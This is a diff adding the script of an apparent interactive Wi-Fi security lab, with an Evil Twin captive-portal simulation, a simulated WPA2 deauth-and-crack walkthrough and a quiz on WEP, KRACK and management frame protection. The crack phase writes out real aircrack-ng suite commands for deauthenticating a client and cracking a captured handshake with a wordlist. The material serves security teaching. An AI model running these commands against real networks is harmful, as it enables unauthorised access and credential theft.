+      const pct=Math.round(Math.max(l,q)*100);  
+      document.getElementById('navFill').style.width=pct+'%';  
+      document.getElementById('navPct').textContent=pct+'%';  
+      document.getElementById('statLab').textContent=labDone.filter(Boolean).length+'/3';
+    }
+
+    // ═══ LAB TABS ═══
+    function showLabTab(n){  
+      currentTab=n;  
+      [0,1,2].forEach(i=>{    
+        document.getElementById(`lp${i}`).style.display=i===n?'block':'none';    
+        document.getElementById(`lt${i}`).classList.toggle('active',i===n);  
+      });
+    }
+
+    // ═══ PHASE 0: WAVE VISUALISER ═══
+    const wc=document.getElementById('waveCanvas');
+    const wx=wc.getContext('2d');
+    let waveParticles=[];
+    let waveMode_current='normal';
+    let waveHSDone=false,waveDeauthDone=false;
+
+    function resizeWave(){
+      wc.width=wc.offsetWidth;
+      wc.height=220;
+    }
+    resizeWave();
+    window.addEventListener('resize',resizeWave);
+
+    function waveMode(m){  
+      waveMode_current=m;  
+      if(m==='deauth'){    
+        waveDeauthDone=true;    
+        for(let i=0;i<8;i++) waveParticles.push({x:wc.width*0.4,y:wc.height*0.5,vx:(Math.random()-0.5)*4,vy:(Math.random()-0.5)*4,color:'rgba(255,77,109,0.9)',size:3,life:1,type:'deauth'});    
+        setTimeout(()=>{waveMode_current='handshake';},2000);  
+      }  
+      if(m==='handshake'){    
+        waveHSDone=true;    
+        for(let i=0;i<12;i++) waveParticles.push({x:wc.width*0.4,y:wc.height*0.5,vx:(Math.random()-0.5)*3,vy:(Math.random()-0.5)*3,color:'rgba(245,158,11,0.9)',size:4,life:1,type:'hs'});    
+        if(!labDone[0]&&waveDeauthDone){      
+          labDone[0]=true;updateProgress();      
+          setTimeout(()=>{        
+            const r=document.getElementById('p0-result');        
+            r.style.display='block';        
+            r.innerHTML=`<div class="mission-complete"><div class="mc-head">✓ Phase 1 Complete — Radio Waves Visualised</div>        <p>You've seen Wi-Fi as it actually exists — electromagnetic radiation propagating in all directions simultaneously. Deauth frames broadcast to every device in range. Handshake frames ride the same waves as normal data — no different from any other packet, just riding the air, waiting to be captured by anyone in monitor mode within 100 metres.</p></div>`;      
+          },800);    
+        }  
+      }  
+      if(m==='normal') waveMode_current='normal';
+    }
+
+    function spawnWaveParticle(){  
+      const isDeauth=waveMode_current==='deauth';  
+      const isHS=waveMode_current==='handshake';  
+      const freq=Math.random()>0.5?'2.4':'5';  
+      waveParticles.push({    
+        x:wc.width*0.38+Math.random()*10-5,y:wc.height*0.5+Math.random()*10-5,    
+        vx:(Math.random()-0.5)*3*(freq==='5'?1.6:1),    
+        vy:(Math.random()-0.5)*3*(freq==='5'?1.6:1),    
+        color:isDeauth?'rgba(255,77,109,0.8)':isHS?'rgba(245,158,11,0.8)':freq==='2.4'?'rgba(168,85,247,0.7)':'rgba(192,132,252,0.8)',    
+        size:isDeauth?3.5:isHS?4:2.5,life:1,type:isDeauth?'deauth':isHS?'hs':freq  
+      });
+    }
+
+    function drawWave(){  
+      wx.clearRect(0,0,wc.width,wc.height);  
+      // router icon  
+      wx.fillStyle='rgba(168,85,247,0.15)';wx.beginPath();wx.arc(wc.width*0.38,wc.height*0.5,30,0,Math.PI*2);wx.fill();  
+      wx.fillStyle='#fff';wx.font='22px serif';wx.textAlign='center';wx.textBaseline='middle';  
+      wx.fillText('📡',wc.width*0.38,wc.height*0.5);  
+      // walls  
+      wx.strokeStyle='rgba(168,85,247,0.15)';wx.lineWidth=2;wx.setLineDash([6,4]);  
+      wx.beginPath();wx.moveTo(wc.width*0.6,0);wx.lineTo(wc.width*0.6,wc.height);wx.stroke();  
+      wx.beginPath();wx.moveTo(wc.width*0.8,0);wx.lineTo(wc.width*0.8,wc.height);wx.stroke();  
+      wx.setLineDash([]);  
+      wx.fillStyle='rgba(168,85,247,0.2)';wx.font='10px JetBrains Mono';wx.textAlign='center';  
+      wx.fillText('WALL 1',wc.width*0.6,10);wx.fillText('WALL 2',wc.width*0.8,10);  
+      // laptop  
+      wx.fillStyle='#fff';wx.font='18px serif';wx.fillText('💻',wc.width*0.88,wc.height*0.5);  
+      // spawn & draw particles  
+      if(Math.random()<0.6) spawnWaveParticle();  
+      waveParticles=waveParticles.filter(p=>{    
+        p.x+=p.vx;p.y+=p.vy;p.life-=0.012;    
+        if(p.x>wc.width*0.6) p.vx*=0.7;    
+        if(p.x>wc.width*0.8) p.vx*=0.5;    
+        wx.globalAlpha=p.life*0.8;    
+        wx.beginPath();wx.arc(p.x,p.y,p.size,0,Math.PI*2);    
+        wx.fillStyle=p.color;wx.fill();    
+        if(p.type==='hs'||p.type==='deauth'){      
+          wx.font='8px JetBrains Mono';wx.fillStyle=p.color;wx.textAlign='center';      
+          wx.fillText(p.type==='hs'?'HS':'DA',p.x,p.y-8);    
+        }    
+        wx.globalAlpha=1;    
+        return p.life>0&&p.x<wc.width&&p.y>0&&p.y<wc.height;  
+      });  
+      requestAnimationFrame(drawWave);
+    }
+    drawWave();
+
+    // ═══ PHASE 1: EVIL TWIN ═══
+    const aps=[  
+      {ssid:'CoffeeShop_Free_WiFi',bssid:'AA:BB:CC:DD:EE:F1',signal:-62,lock:'🔓',evil:false,id:'real'},  
+      {ssid:'CoffeeShop_Free_WiFi',bssid:'DE:AD:BE:EF:00:99',signal:-45,lock:'🔓',evil:true,id:'evil'},  
+      {ssid:'BT-HomeHub-7832',bssid:'11:22:33:44:55:66',signal:-78,lock:'🔒',evil:false,id:'bt'},  
+      {ssid:'SKY12345',bssid:'AA:11:BB:22:CC:33',signal:-81,lock:'🔒',evil:false,id:'sky'},  
+      {ssid:'NETGEAR-Guest',bssid:'FF:EE:DD:CC:BB:AA',signal:-74,lock:'🔓',evil:false,id:'ng'},
+    ];
+
+    function renderAPs(){  
+      document.getElementById('apList').innerHTML=aps.map(a=>`    
+        <div class="ap-item ${a.evil?'evil':''}">      
+          <span class="ap-icon">📶</span>      
+          <div><div class="ap-ssid">${a.ssid}${a.evil?'<span class="evil-tag">★ STRONGER SIGNAL</span>':''}</div><div class="ap-bssid">${a.bssid}</div></div>      
+          <span class="ap-signal ${a.signal>-70?'strong':'medium'}">${a.signal} dBm</span>      
+          <span class="ap-lock">${a.lock}</span>      
+          <button class="ap-connect-btn" id="apbtn-${a.id}" onclick="connectAP('${a.id}','${a.evil}')">Connect</button>    
+        </div>`).join('');  
+      setTimeout(()=>{document.getElementById('scanStatus').textContent='● 5 networks found';},1200);
+    }
+    renderAPs();
+    setTimeout(()=>document.getElementById('p1-captive').style.display='block',3000);
+    document.getElementById('p1-captive').style.display='block';
+
+    function connectAP(id,evil){  
+      document.querySelectorAll('.ap-connect-btn').forEach(b=>{b.textContent='Connect';b.className='ap-connect-btn';});  
+      const btn=document.getElementById(`apbtn-${id}`);  
+      btn.textContent='✓ Connected';btn.classList.add('connected-btn');  
+      if(evil==='true'){    
+        document.getElementById('captivePortal').style.display='block';  
+      } else {    
+        document.getElementById('captivePortal').style.display='none';  
+      }
+    }
+    document.getElementById('captivePortal').style.display='none';
+
+    function submitCaptive(){  
+      const em=document.getElementById('captiveEmail').value||'victim@email.com';  
+      const pw=document.getElementById('captivePass').value||'MyPassword123';  
+      const stolen=document.getElementById('captiveStolen');  
+      stolen.style.display='block';  
+      document.getElementById('stolenCreds').innerHTML=    
+        `[22:41:07] New victim connected from 192.168.1.42<br>[22:41:07] Email: <span style="color:var(--red)">${em}</span><br>[22:41:07] Password: <span style="color:var(--red)">${pw}</span><br>[22:41:07] User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_0...)`;  
+      if(!labDone[1]){    
+        labDone[1]=true;updateProgress();    
+        setTimeout(()=>{      
+          const r=document.getElementById('p1-result');      
+          r.style.display='block';      
+          r.innerHTML=`<div class="mission-complete"><div class="mc-head">✓ Phase 2 Complete — Evil Twin Attack Executed</div>      <p>The victim connected to your Evil Twin network and submitted their credentials on your captive portal. They received internet access (you forward their traffic) so they never noticed anything wrong. Their email and password are now logged on your machine. This attack requires zero technical knowledge from the victim's side — it looks exactly like a normal Wi-Fi login page.</p></div>`;      
+          r.scrollIntoView({behavior:'smooth',block:'center'});    
+        },500);  
+      }
+    }
+
+    // ═══ PHASE 2: DEAUTH + CRACK ═══
+    const words=['12345678','password','qwerty123','letmein','monkey','dragon','baseball','iloveyou','sunshine','princess',  'superman','coffee','welcome1','admin123','passw0rd','shadow','master','jordan','jordan23','network',  'security','hacker','wireless','router','CoffeeShop1','hunter2','correct','staple','battery','horse'];
+    let crackIdx=0,crackRunning=false,crackTotal=14344391,stepsDone=0;
+
+    const crackCommandList=[  
+      {cmd:'airmon-ng start wlan0',desc:'Enable monitor mode on wireless interface',step:0,output:[    
+        {t:'faint',text:'# Monitor mode lets your adapter capture ALL Wi-Fi packets, not just those addressed to you'},    
+        {t:'ok',text:'PHY Interface Driver Chipset'},    
+        {t:'ok',text:'phy0 wlan0 ath9k Qualcomm Atheros AR9462'},    
+        {t:'hi',text:'(mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)'},    
+        {t:'ok',text:'Monitor mode enabled: wlan0mon'}  
+      ]},  
+      {cmd:'airodump-ng wlan0mon',desc:'Scan for nearby networks and find target BSSID/channel',step:1,output:[    
+        {t:'faint',text:'# Scanning all channels — identifying target AP'},    
+        {t:'hi',text:' BSSID              PWR  Beacons  #Data  CH  MB   ENC    ESSID'},    
+        {t:'text',text:' AA:BB:CC:DD:EE:F1  -62      84    312   6  54e  WPA2  CoffeeShop_Free_WiFi'},    
+        {t:'text',text:' 11:22:33:44:55:66  -78      41     23  11  54e  WPA2  BT-HomeHub-7832'},    
+        {t:'ok',text:'Target identified: AA:BB:CC:DD:EE:F1 on CH 6 — WPA2'}  
+      ]},  
+      {cmd:'airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:F1 -w capture wlan0mon',desc:'Lock onto target channel and start capturing',step:1,output:[    
+        {t:'faint',text:'# -c 6 = channel 6 &nbsp;|&nbsp; --bssid = filter to target AP &nbsp;|&nbsp; -w capture = write to file'},    
+        {t:'hi',text:'CH 6 ][ Elapsed: 12 s ][ 2024-01-15 22:41'},    
+        {t:'text',text:' BSSID              STATION            PWR   Rate   Frames  Probe'},    
+        {t:'text',text:' AA:BB:CC:DD:EE:F1  CC:DD:EE:FF:00:11  -64    54-6      47'},    
+        {t:'hi',text:'Waiting for WPA handshake... (client CC:DD:EE:FF:00:11 is connected)'}  
+      ]},  
+      {cmd:'aireplay-ng -0 5 -a AA:BB:CC:DD:EE:F1 -c CC:DD:EE:FF:00:11 wlan0mon',desc:'Send 5 deauthentication frames to force reconnect',step:2,output:[    
+        {t:'faint',text:'# -0 5 = send 5 deauth frames &nbsp;|&nbsp; -a = target AP BSSID &nbsp;|&nbsp; -c = target client MAC'},    
+        {t:'bad',text:'22:41:33 Sending 64 directed DeAuth (code 7). STMAC: [CC:DD:EE:FF:00:11]'},    
+        {t:'bad',text:'22:41:33 Sending 64 directed DeAuth (code 7). STMAC: [CC:DD:EE:FF:00:11]'},    
+        {t:'hi',text:'22:41:34 WPA handshake: AA:BB:CC:DD:EE:F1 — CAPTURED!'},    
+        {t:'ok',text:'Handshake written to capture-01.cap'}  
+      ]},  
+      {cmd:'aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap',desc:'Run dictionary attack against captured handshake',step:4,crack:true,output:[    
+        {t:'faint',text:'# rockyou.txt contains 14,344,391 real passwords from data breaches'},    
+        {t:'hi',text:'Opening capture-01.cap'},    
+        {t:'text',text:'Read 1 packets — 1 WPA handshake'},  
+      ]}
+    ];
+
+    function renderCrackCmds(){  
+      document.getElementById('crackCmds').innerHTML=crackCommandList.map((c,i)=>`    
+        <div class="cmd-chip" id="ccmd-${i}" onclick="runCrackCmd(${i})">      
+          <div><div class="cmd-code">$ ${c.cmd}</div><div class="cmd-desc">${c.desc}</div></div>      
+          <span style="color:var(--text-faint);font-size:18px;flex-shrink:0">▶</span>    
+        </div>`).join('');
+    }
+    renderCrackCmds();
+
+    function setHSStep(n){  
+      for(let i=0;i<=5;i++){    
+        const el=document.getElementById(`hss${i}`);    
+        if(i<n) el.className='hs-step done';    
+        else if(i===n) el.className='hs-step active-step';    
+        else el.className='hs-step';    
+        el.textContent=(i<n?'[✓] ':'[→] ')+el.textContent.slice(4);  
+      }
+    }
+
+    function runCrackCmd(i){  
+      document.getElementById(`ccmd-${i}`).classList.add('used');  
+      const c=crackCommandList[i];  
+      const out=document.getElementById('crackOutput');  
+      out.innerHTML+=`<div class="term-line" style="margin-top:0.5rem"><span class="term-prompt">root@kali:~#</span><span class="term-cmd"> ${c.cmd}</span></div>`;  
+      c.output.forEach(o=>{out.innerHTML+=`<span class="term-out ${o.t==='text'?'':o.t}">${o.text}</span>`;});  
+      out.innerHTML+=`<div class="term-line" style="margin-top:4px"><span class="term-prompt">root@kali:~#</span><span class="term-cursor"></span></div>`;  
+      out.scrollTop=out.scrollHeight;  
+      if(c.step!==undefined) setHSStep(c.step+1);  
+      if(c.step===2){
+        document.getElementById('hn-client').className='hs-anim-node captured';
+        document.getElementById('hn-attacker').className='hs-anim-node active';
+      }  
+      if(c.crack) startCrack();
+    }
+
+    function startCrack(){  
+      crackRunning=true;  
+      document.getElementById('crackWrap').style.display='block';  
+      const wordDiv=document.getElementById('wordlistInner');  
+      const target='CoffeeShop1';  
+      // fill wordlist  
+      let allWords=[...Array(20)].map((_,i)=>words[i%words.length]);  
+      allWords.push(target);  
+      wordDiv.innerHTML=allWords.map(w=>`<div>${w}</div>`).join('');  
+      let pos=0,total=0,found=false;  
+      const interval=setInterval(()=>{    
+        total+=Math.floor(800+Math.random()*400);    
+        pos=Math.min(total,crackTotal);    
+        const pct=Math.min(100,(total/crackTotal)*100);    
+        document.getElementById('crackBar').style.width=pct+'%';    
+        document.getElementById('crackWords').textContent=total.toLocaleString()+' / '+crackTotal.toLocaleString()+' words tested';    
+        document.getElementById('crackSpeed').textContent=Math.floor(900+Math.random()*200).toLocaleString()+' keys/sec';    
+        const eta=Math.max(0,Math.floor((crackTotal-total)/950));    
+        document.getElementById('crackEta').textContent=total>crackTotal*0.7?'Almost...':`ETA: ${eta}s`;    
+        const scrollPos=-(pos/crackTotal)*allWords.length*24;    
+        wordDiv.style.transform=`translateY(${scrollPos}px)`;    
+        if(total>crackTotal*0.72&&!found){      
+          found=true;clearInterval(interval);      
+          document.getElementById('crackBar').style.width='100%';      
+          document.getElementById('crackBar').style.background='var(--green)';      
+          document.getElementById('crackWords').textContent='KEY FOUND!';      
+          document.getElementById('crackEta').textContent='✓ Done';      
+          setHSStep(5);      
+          const out=document.getElementById('crackOutput');      
+          out.innerHTML+=`<br><span class="term-out ok">KEY FOUND! [ CoffeeShop1 ]</span>`;      
+          out.innerHTML+=`<span class="term-out faint">Master Key: A3 4F 21 9C D8 11 7E 40 B2 55 91 C3 08 6E A1 2D</span>`;      
+          out.innerHTML+=`<span class="term-out ok">Passphrase for AA:BB:CC:DD:EE:F1: CoffeeShop1</span>`;      
+          out.scrollTop=out.scrollHeight;      
+          if(!labDone[2]){        
+            labDone[2]=true;updateProgress();        
+            setTimeout(()=>{          
+              const r=document.getElementById('p2-result');          
+              r.style.display='block';          
+              r.innerHTML=`<div class="mission-complete"><div class="mc-head">✓ Phase 3 Complete — Handshake Cracked!</div>          <p>aircrack-ng found the password <code>CoffeeShop1</code> in the rockyou.txt wordlist. The entire process — deauth, capture, crack — took under 2 minutes. With this password you can now join the real network, decrypt previously captured WPA2 traffic (if you have the handshake), or use it as a credential in other attacks. This is why strong, random Wi-Fi passwords matter — anything in a wordlist is crackable.</p></div>`;          
+              r.scrollIntoView({behavior:'smooth',block:'center'});        
+            },500);      
+          }    
+        }  
+      },150);
+    }
+
+    // ═══ QUIZ ═══
+    const quizData=[  
+      {q:'WEP (Wired Equivalent Privacy) uses the RC4 cipher with Initialisation Vectors (IVs). What specific design flaw makes WEP crackable in under 60 seconds, regardless of the key length?',   opts:['RC4 is a weak cipher that can be brute-forced in seconds on modern hardware','The 24-bit IV space is so small that IVs repeat frequently — statistical analysis of repeated IVs recovers the key without brute force','WEP transmits the encryption key in plain text in the packet header','WEP uses a fixed IV of all zeros, making every packet identical'],   correct:1,explain:'WEP\'s fatal flaw is IV reuse. With only 24 bits, there are just 16,777,216 possible IVs. On a busy network generating thousands of packets per second, IVs repeat within minutes. An attacker captures enough packets sharing the same IV, performs statistical analysis of the RC4 keystream XOR, and recovers the full encryption key — regardless of whether it\'s 40-bit or 104-bit. Key length is irrelevant when the fundamental design is broken.'},  
+      {q:'WPA2\'s AES-CCMP encryption has never been broken. So why can an attacker with a captured WPA2 4-way handshake still potentially recover the Wi-Fi password?',   opts:['The 4-way handshake contains the password in base64 encoding as part of message 2','The handshake contains cryptographic material that can be used to verify password guesses offline — if the password is in a wordlist, it can be cracked without interacting with the AP','AES encryption is broken if the attacker knows the SSID of the network','WPA2 uses a predictable pseudo-random number generator that allows key recovery'],   correct:1,explain:'The WPA2 handshake contains a MIC (Message Integrity Code) that is computed using a key derived from the password, the SSID, and random nonces. An attacker who captures the handshake can compute candidate PTKs (Pairwise Transient Keys) from password guesses and check if they produce a matching MIC — entirely offline, at millions of guesses per second. The encryption itself remains unbroken; it\'s the password verification mechanism that enables offline dictionary attacks.'},  
+      {q:'What makes a deauthentication attack against WPA2 networks possible, and what does WPA3\'s Management Frame Protection (MFP / 802.11w) do to prevent it?',   opts:['WPA2 deauth attacks exploit a buffer overflow in the driver — MFP patches the driver vulnerability','802.11 management frames in WPA2 are unauthenticated — any device can forge a deauth frame. MFP cryptographically signs management frames so forged deauth frames are detectable and dropped','WPA2 has no protection against deauth because it uses a shared secret for management frames that attackers can derive','MFP prevents deauth attacks by encrypting all Wi-Fi traffic, making frame injection impossible'],   correct:1,explain:'In 802.11 (Wi-Fi), management frames — including deauthentication frames — were historically sent without authentication or integrity protection. Any device can craft a deauth frame claiming to be from any AP, and clients will disconnect. This is a design decision from Wi-Fi\'s original specification. 802.11w (Management Frame Protection), mandated in WPA3, cryptographically signs management frames using the session keys established during authentication. A forged deauth from an attacker without the session key is detected and ignored.'},  
+      {q:'An Evil Twin attack creates a fake AP with the same SSID as a legitimate network. Why do many devices automatically connect to the attacker\'s AP even without user interaction, and what makes the attack nearly undetectable to the victim?',   opts:['Evil Twin APs exploit a vulnerability in the 802.11 association protocol that forces reconnection','Devices auto-connect to remembered SSIDs by signal strength — the Evil Twin broadcasts at higher power. The victim sees the same network name, no certificate warning, and receives working internet as the attacker proxies traffic transparently','The Evil Twin sends a special beacon frame that overrides the device\'s connection preferences','Most devices have auto-join disabled by default — the attack requires the victim to manually select the Evil Twin'],   correct:1,explain:'Wi-Fi clients remember networks by SSID only — not by BSSID (the AP\'s MAC address). When a device sees a familiar SSID, it evaluates the signal strength and connects to the strongest access point broadcasting that name. An Evil Twin operating at higher power wins the election automatically, triggering auto-connect without any user interaction. The victim receives working internet (the attacker proxies traffic), sees the expected network name, and encounters no certificate warnings — there is nothing visually distinguishable from a legitimate connection.'},  
+      {q:'The KRACK attack (Key Reinstallation Attack) from 2017 exploited the WPA2 4-way handshake but did NOT break AES encryption. What did it actually exploit, and why does it primarily affect clients rather than access points?',   opts:['KRACK broke AES-256 through a timing side-channel attack on the access point\'s hardware','KRACK exploited the handshake\'s retransmission mechanism — replaying message 3 forced clients to reinstall an already-used cryptographic key, resetting nonces and allowing decryption of some traffic. APs typically do not retransmit MSG3 so were largely unaffected','KRACK exploited a vulnerability in the TCP stack that caused clients to accept decrypted traffic without verification','KRACK required physical access to the router and exploited a vulnerability in the WPS (Wi-Fi Protected Setup) pin authentication'],   correct:1,explain:'KRACK exploited the WPA2 handshake\'s reliability mechanism. When an AP sends message 3 of the handshake and doesn\'t receive an acknowledgement, it retransmits. An attacker can replay this message 3, causing the client to reinstall an already-used session key and reset its nonce counter to zero. Nonce reuse in AES-CCMP breaks confidentiality and integrity for affected traffic. Access points typically send MSG3 but don\'t receive it, so they aren\'t vulnerable to reinstallation — the vulnerability is almost entirely on the client side. All major operating systems patched this within months of disclosure in 2017.'}
+    ];
+
+    function renderQuiz(){  
+      document.getElementById('quizQuestions').innerHTML=quizData.map((q,qi)=>`    
+        <div class="quiz-q" id="qq-${qi}">      
+          <div class="quiz-q-text">${qi+1}. ${q.q}</div>      
+          <div class="quiz-options">${q.opts.map((o,oi)=>`        
+            <div class="quiz-option" id="qo-${qi}-${oi}" onclick="answerQuiz(${qi},${oi})">          
+              <div class="quiz-opt-key">${'ABCD'[oi]}</div>${o}</div>`).join('')}      
+          </div>      
+          <div class="quiz-explain" id="qe-${qi}">${q.explain}</div>    
+        </div>`).join('');
+    }
+
+    function answerQuiz(qi,oi){  
+      if(quizCorrect.has(qi))return;  
+      const q=quizData[qi];  
+      document.querySelectorAll(`[id^="qo-${qi}-"]`).forEach(el=>el.style.pointerEvents='none');  
+      document.getElementById(`qo-${qi}-${oi}`).classList.add(oi===q.correct?'correct':'wrong');  
+      document.getElementById(`qo-${qi}-${q.correct}`).classList.add('correct');  
+      document.getElementById(`qe-${qi}`).classList.add('show');  
+      if(oi===q.correct){quizCorrect.add(qi);updateQuizScore();}
+    }
+
+    function updateQuizScore(){  
+      document.getElementById('quizScore').textContent=`${quizCorrect.size} / 5 correct`;  
+      if(quizCorrect.size===5)setTimeout(showCompletion,600);
+    }
+
+    function showCompletion(){  
+      const mins=Math.max(1,Math.round((Date.now()-startTime)/60000));  
+      document.getElementById('statTime').textContent=mins;  
+      const c=document.getElementById('completion');  
+      c.style.display='flex';  
+      setTimeout(()=>c.classList.add('visible'),50);  
+      document.getElementById('navFill').style.width='100%';  
+      document.getElementById('navPct').textContent='100%';  
+      setTimeout(() => {
+        const flagCard = c.querySelector('.futuristic-flag-card');
+        if (flagCard) {
+          flagCard.scrollIntoView({behavior:'smooth',block:'center'});
+        } else {
+          c.scrollIntoView({behavior:'smooth',block:'start'});
+        }
+      }, 300);
+    }
+    
+    renderQuiz();
+    updateProgress();
+  </script>
+</body>
+</html>
